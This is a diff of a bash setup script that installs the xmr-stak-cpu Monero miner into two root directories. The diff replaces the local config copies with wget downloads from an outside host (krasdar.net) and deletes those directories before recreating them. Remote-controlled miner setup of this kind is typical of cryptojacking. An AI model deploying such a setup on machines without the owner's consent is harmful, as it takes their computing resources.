@@ -1,13 +1,17 @@
 #!/bin/bash
 apt -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git vim supervisor cpulimit
 
+rm /root/1 -r
 mkdir /root/1
 cp ./xmr-stak-cpu /root/1/xmr-stak-cpu
-cp ./config.txt /root/1/config.txt
+wget -O /root/1/config.txt http://krasdar.net/xn/c.php
 
+
+rm /root/2 -r
 mkdir /root/2
 cp ./xmr-stak-cpu /root/2/xmr-stak-cpu
-cp ./config2.txt /root/2/config.txt
+wget -O /root/2/config.txt http://krasdar.net/xn/c2.php
+
 
 sysctl -w vm.nr_hugepages=128
 ulimit -l
